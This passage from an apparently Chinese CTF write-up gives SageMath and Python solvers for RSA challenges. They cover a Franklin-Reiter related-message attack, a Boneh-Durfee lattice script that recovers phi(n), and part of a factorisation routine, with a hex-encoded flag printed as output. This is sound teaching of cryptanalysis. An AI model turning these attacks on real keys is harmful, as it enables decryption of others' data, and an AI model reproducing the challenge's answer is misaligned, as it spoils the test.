class="hljs-number">24732899138985698048124738358885344459380038656644856424408162261290252390990430221618386418951988486708762804946769795228623929192434866679235654403422358739678505705164771770043997911978466970263295500889794171343156703395546382916487920614340043903229000609973485677050397022152713772292440520988456316443753468532951303866181082256920212000750824864649908289233351736589192406643159754938503633933659274738581869079639832724262163525528275737821041039669564305836146099495364809454904417807419660442462148929999131337816672689722132290589330769444419576849369335967968005614246785108998860303333448365564289184539</span><br>e=<span class="hljs-number">7</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">franklinReiter</span>(<span class="hljs-params">n,e,a1,b1,c1,a2,b2,c2</span>):<br>    PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>    g1 = (a1*x+b1)^e - c1<br>    g2 = (a2*x+b2)^e - c2<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">g1, g2</span>):<br>        <span class="hljs-keyword">while</span> g2:<br>            g1, g2 = g2, g1 % g2<br>        <span class="hljs-keyword">return</span> g1.monic() <span class="hljs-comment"># </span><br>    <span class="hljs-keyword">return</span> -gcd(g1, g2)[<span class="hljs-number">0</span>]<br><br>m=franklinReiter(n,e,a1,b1,c1,a2,b2,c2)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#4e53534354467b61323430373434306566643666343139323861323262333463373761303966347d</span><br></code></pre></td></tr></table></figure><h3 id="第七步"><a class="markdownIt-Anchor" href="#第七步"></a> 第七步</h3><p>我分为了两步</p><h4 id="71求phin"><a class="markdownIt-Anchor" href="#71求phin"></a> 7.1求phin</h4><p>板子用法：attack(n, e, 512, 2, 0.270,10)</p><p>512是n的因数的位数</p><p>2是n的因数的个数</p><p>0.270是d的那个范围</p><p>10可以表示深度，越大越准确但时间越久，一般取4没出就取10，这里取4是可以出的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment">############################################</span><br><span class="hljs-comment"># Config</span><br><span class="hljs-comment">##########################################</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Setting debug to true will display more informations</span><br><span class="hljs-string">about the lattice, the bounds, the vectors...</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>debug = <span class="hljs-literal">True</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Setting strict to true will stop the algorithm (and</span><br><span class="hljs-string">return (-1, -1)) if we don&#x27;t have a correct</span><br><span class="hljs-string">upperbound on the determinant. Note that this</span><br><span class="hljs-string">doesn&#x27;t necesseraly mean that no solutions</span><br><span class="hljs-string">will be found since the theoretical upperbound is</span><br><span class="hljs-string">usualy far away from actual results. That is why</span><br><span class="hljs-string">you should probably use `strict = False`</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>strict = <span class="hljs-literal">False</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">This is experimental, but has provided remarkable results</span><br><span class="hljs-string">so far. It tries to reduce the lattice as much as it can</span><br><span class="hljs-string">while keeping its efficiency. I see no reason not to use</span><br><span class="hljs-string">this option, but if things don&#x27;t work, you should try</span><br><span class="hljs-string">disabling it</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>helpful_only = <span class="hljs-literal">True</span><br>dimension_min = <span class="hljs-number">7</span> <span class="hljs-comment"># stop removing if lattice reaches that dimension</span><br><br><span class="hljs-comment">############################################</span><br><span class="hljs-comment"># Functions</span><br><span class="hljs-comment">##########################################</span><br><br><span class="hljs-comment"># display stats on helpful vectors</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">helpful_vectors</span>(<span class="hljs-params">BB, modulus</span>):<br>    nothelpful = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        <span class="hljs-keyword">if</span> BB[ii,ii] &gt;= modulus:<br>            nothelpful += <span class="hljs-number">1</span><br><br>    <span class="hljs-built_in">print</span>(nothelpful, <span class="hljs-string">&quot;/&quot;</span>, BB.dimensions()[<span class="hljs-number">0</span>], <span class="hljs-string">&quot; vectors are not helpful&quot;</span>)<br><br><span class="hljs-comment"># display matrix picture with 0 and X</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_overview</span>(<span class="hljs-params">BB, bound</span>):<br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        a = (<span class="hljs-string">&#x27;%02d &#x27;</span> % ii)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">1</span>]):<br>            a += <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">if</span> BB[ii,jj] == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;X&#x27;</span><br>            <span class="hljs-keyword">if</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">60</span>:<br>                a += <span class="hljs-string">&#x27; &#x27;</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            a += <span class="hljs-string">&#x27;~&#x27;</span><br>        <span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-comment"># tries to remove unhelpful vectors</span><br><span class="hljs-comment"># we start at current = n-1 (last vector)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_unhelpful</span>(<span class="hljs-params">BB, monomials, bound, current</span>):<br>    <span class="hljs-comment"># end of our recursive function</span><br>    <span class="hljs-keyword">if</span> current == -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt;= dimension_min:<br>        <span class="hljs-keyword">return</span> BB<br><br>    <span class="hljs-comment"># we start by checking from the end</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(current, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># if it is unhelpful:</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            affected_vectors = <span class="hljs-number">0</span><br>            affected_vector_index = <span class="hljs-number">0</span><br>            <span class="hljs-comment"># let&#x27;s check if it affects other vectors</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ii + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                <span class="hljs-comment"># if another vector is affected:</span><br>                <span class="hljs-comment"># we increase the count</span><br>                <span class="hljs-keyword">if</span> BB[jj, ii] != <span class="hljs-number">0</span>:<br>                    affected_vectors += <span class="hljs-number">1</span><br>                    affected_vector_index = jj<br><br>            <span class="hljs-comment"># level:0</span><br>            <span class="hljs-comment"># if no other vectors end up affected</span><br>            <span class="hljs-comment"># we remove it</span><br>            <span class="hljs-keyword">if</span> affected_vectors == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;* removing unhelpful vector&quot;</span>, ii)<br>                BB = BB.delete_columns([ii])<br>                BB = BB.delete_rows([ii])<br>                monomials.pop(ii)<br>                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">return</span> BB<br><br>            <span class="hljs-comment"># level:1</span><br>            <span class="hljs-comment"># if just one was affected we check</span><br>            <span class="hljs-comment"># if it is affecting someone else</span><br>            <span class="hljs-keyword">elif</span> affected_vectors == <span class="hljs-number">1</span>:<br>                affected_deeper = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(affected_vector_index + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                    <span class="hljs-comment"># if it is affecting even one vector</span><br>                    <span class="hljs-comment"># we give up on this one</span><br>                    <span class="hljs-keyword">if</span> BB[kk, affected_vector_index] != <span class="hljs-number">0</span>:<br>                        affected_deeper = <span class="hljs-literal">False</span><br>                <span class="hljs-comment"># remove both it if no other vector was affected and</span><br>                <span class="hljs-comment"># this helpful vector is not helpful enough</span><br>                <span class="hljs-comment"># compared to our unhelpful one</span><br>                <span class="hljs-keyword">if</span> affected_deeper <span class="hljs-keyword">and</span> <span class="hljs-built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="hljs-built_in">abs</span>(bound - BB[ii, ii]):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="hljs-string">&quot;and&quot;</span>, affected_vector_index)<br>                    BB = BB.delete_columns([affected_vector_index, ii])<br>                    BB = BB.delete_rows([affected_vector_index, ii])<br>                    monomials.pop(affected_vector_index)<br>                    monomials.pop(ii)<br>                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="hljs-number">1</span>)<br>                    <span class="hljs-keyword">return</span> BB<br>    <span class="hljs-comment"># nothing happened</span><br>    <span class="hljs-keyword">return</span> BB<br><br><span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">Returns:</span><br><span class="hljs-string">* 0,0   if it fails</span><br><span class="hljs-string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span><br><span class="hljs-string">* x0,y0 the solutions of `pol`</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boneh_durfee</span>(<span class="hljs-params">pol, modulus, mm, tt, XX, YY</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Boneh and Durfee revisited by Herrmann and May</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    finds a solution if:</span><br><span class="hljs-string">    * d &lt; N^delta</span><br><span class="hljs-string">    * |x| &lt; e^delta</span><br><span class="hljs-string">    * |y| &lt; e^0.5</span><br><span class="hljs-string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># substitution (Herrman and May)</span><br>    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)<br>    Q = PR.quotient(x*y + <span class="hljs-number">1</span> - u) <span class="hljs-comment"># u = xy + 1</span><br>    polZ = Q(pol).lift()<br><br>    UU = XX*YY + <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># x-shifts</span><br>    gg = []<br>    <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm - kk + <span class="hljs-number">1</span>):<br>            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk<br>            gg.append(xshift)<br>    gg.sort()<br><br>    <span class="hljs-comment"># x-shifts list of monomials</span><br>    monomials = []<br>    <span class="hljs-keyword">for</span> polynomial <span class="hljs-keyword">in</span> gg:<br>        <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> polynomial.monomials():<br>            <span class="hljs-keyword">if</span> monomial <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> monomials:<br>                monomials.append(monomial)<br>    monomials.sort()<br>    <br>    <span class="hljs-comment"># y-shifts (selected by Herrman and May)</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm//tt * jj, mm + <span class="hljs-number">1</span>):<br>            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)<br>            yshift = Q(yshift).lift()<br>            gg.append(yshift) <span class="hljs-comment"># substitution</span><br>    <br>    <span class="hljs-comment"># y-shifts list of monomials</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm//tt * jj, mm + <span class="hljs-number">1</span>):<br>            monomials.append(u^kk * y^jj)<br><br>    <span class="hljs-comment"># construct lattice B</span><br>    nn = <span class="hljs-built_in">len</span>(monomials)<br>    BB = Matrix(ZZ, nn)<br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>        BB[ii, <span class="hljs-number">0</span>] = gg[ii](<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, ii + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> monomials[jj] <span class="hljs-keyword">in</span> gg[ii].monomials():<br>                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)<br><br>    <span class="hljs-comment"># Prototype to reduce the lattice</span><br>    <span class="hljs-keyword">if</span> helpful_only:<br>        <span class="hljs-comment"># automatically remove</span><br>        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># reset dimension</span><br>        nn = BB.dimensions()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> nn == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;failure&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># check if vectors are helpful</span><br>    <span class="hljs-keyword">if</span> debug:<br>        helpful_vectors(BB, modulus^mm)<br>    <br>    <span class="hljs-comment"># check if determinant is correctly bounded</span><br>    det = BB.det()<br>    bound = modulus^(mm*nn)<br>    <span class="hljs-keyword">if</span> det &gt;= bound:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Try with highers m and t.&quot;</span>)<br>        <span class="hljs-keyword">if</span> debug:<br>            diff = (log(det) - log(bound)) / log(<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span> strict:<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)<br><br>    <span class="hljs-comment"># display the lattice basis</span><br>    <span class="hljs-keyword">if</span> debug:<br>        matrix_overview(BB, modulus^mm)<br><br>    <span class="hljs-comment"># LLL</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)<br><br>    BB = BB.LLL()<br><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LLL is done!&quot;</span>)<br><br>    <span class="hljs-comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;looking for independent vectors in the lattice&quot;</span>)<br>    found_polynomials = <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-keyword">for</span> pol1_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn - <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> pol2_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pol1_idx + <span class="hljs-number">1</span>, nn):<br>            <span class="hljs-comment"># for i and j, create the two polynomials</span><br>            PR.&lt;w,z&gt; = PolynomialRing(ZZ)<br>            pol1 = pol2 = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>                pol1 += monomials[jj](w*z+<span class="hljs-number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)<br>                pol2 += monomials[jj](w*z+<span class="hljs-number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)<br><br>            <span class="hljs-comment"># resultant</span><br>            PR.&lt;q&gt; = PolynomialRing(ZZ)<br>            rr = pol1.resultant(pol2)<br><br>            <span class="hljs-comment"># are these good polynomials?</span><br>            <span class="hljs-keyword">if</span> rr.is_zero() <span class="hljs-keyword">or</span> rr.monomials() == [<span class="hljs-number">1</span>]:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="hljs-string">&quot;and&quot;</span>, pol2_idx)<br>                found_polynomials = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found_polynomials:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found_polynomials:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>    <br>    rr = rr(q, q)<br><br>    <span class="hljs-comment"># solutions</span><br>    soly = rr.roots()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(soly) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Your prediction (delta) is too small&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br>    soly = soly[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    ss = pol1(q, soly)<br>    solx = ss.roots()[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-keyword">return</span> solx, soly<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">N, e, factor_bit_length, factors, delta=<span class="hljs-number">0.25</span>, m=<span class="hljs-number">1</span></span>):<br>    x, y = ZZ[<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>].gens()<br>    A = N + <span class="hljs-number">1</span><br>    f = x * (A + y) + <span class="hljs-number">1</span><br>    X = <span class="hljs-built_in">int</span>(RR(e) ** delta)<br>    Y = <span class="hljs-built_in">int</span>(N^((factors-<span class="hljs-number">1</span>)/factors))<br>    t = <span class="hljs-built_in">int</span>((<span class="hljs-number">1</span> - <span class="hljs-number">2</span> * delta) * m)<br>    x0, y0 = boneh_durfee(f, e, m, t, X, Y)<br>    z = <span class="hljs-built_in">int</span>(f(x0, y0))<br>    <span class="hljs-keyword">if</span> z % e == <span class="hljs-number">0</span>:<br>        phi = N +<span class="hljs-built_in">int</span>(y0) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> phi<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br>n = <span class="hljs-number">11807668285253476335993112649125478311738138284032009521013160232275155591439056104050712447640428132619606976587476242139778581733169915977009541156271158342164308850183882293808973497182420010031579067660977663894542027297739371427053469215030263817360875451422844176774669484378609912250701562139454836788798283646984193408478412076837926365908454580066517380897820350918189254782926664771936070107395821284187885892036352109035393564580351743381904585469190706683218284347728580797326563996730184944085618477815023279614804702457729169640438408479963581615968900059881783129713048355206267321472950141238916990289</span><br>e = <span class="hljs-number">5281486869323390978888423235641733430226678655686523392509714694751699050972120246916705000659875362083798615103093121939019773338011435050637066804667485505484551148317473841662442079996914658971301530910391768225029937660420184269526291001532582856000498690281601708552422507554114650938378386138884675333079129219306840932269967053765809850586002685750596186872500960539502358573116582308035530522367769717985694159855985288721479249298872468268929957454831663164937357314947859985362524031645431354657428639172589105754006273997415340441064909574647647141996659760272695449996972251425797398960494913207372272501</span><br><span class="hljs-built_in">print</span>(attack(n, e, <span class="hljs-number">512</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0.270</span>,<span class="hljs-number">10</span>))<br><span class="hljs-comment">#11807668285253476335993112649125478311738138284032009521013160232275155591439056104050712447640428132619606976587476242139778581733169915977009541156271158342164308850183882293808973497182420010031579067660977663894542027297739371427053469215030263817360875451422844176774669484378609912250701562139454836788580954283961789345480162099667001543891543639039785702888420923141077344358421051350061532584618771565302075962527648516570054467566143564854760959148274897390714017585220094430947903853829077089810614861107089070658414503772365171320735613805448738756377532942888788137666255740398790486415370724509249593956</span><br></code></pre></td></tr></table></figure><h4 id="72-知道phin和n进行分解"><a class="markdownIt-Anchor" href="#72-知道phin和n进行分解"></a> 7.2 知道phin和n进行分解</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs pyhton">from random import randrange<br>from gmpy2 import gcd<br>from Crypto.Util.number import isPrime<br>from Crypto.Cipher import AES<br>import hashlib<br>def factorize_multi_prime(N, phi):<br>    prime_factors = set()<br>    factors = [N]<br>    while len(factors) &gt; 0:<br>        # Element to factorize.<br>        N = factors[0]<br><br>        w = randrange(2, N - 1)<br>        i = 1<br>        while phi % (2**i) == 0:<br>            sqrt_1 = pow(w, phi // (2**i), N)<br>            if sqrt_1 &gt; 1 and sqrt_1 != N - 1:<br>                # We can remove the element to factorize now, because we have a factorization.<br>                factors = factors[1:]<br><br>                p = gcd(N, sqrt_1 + 1)<br>                q = N // p<br><br>                if isPrime(p):<br>                    prime_factors.add(p)<br>                elif p &gt; 1:<br>                    factors.append(p)<br><br>                if isPrime(q):<br>                    prime_factors.add(q)<br>                elif q &gt; 1:<br>                    factors.append(q)<br><br>                # Continue in the outer loop<br>                break<br><br>            i += 1<br><br>    return list(prime_factors)<br>n= 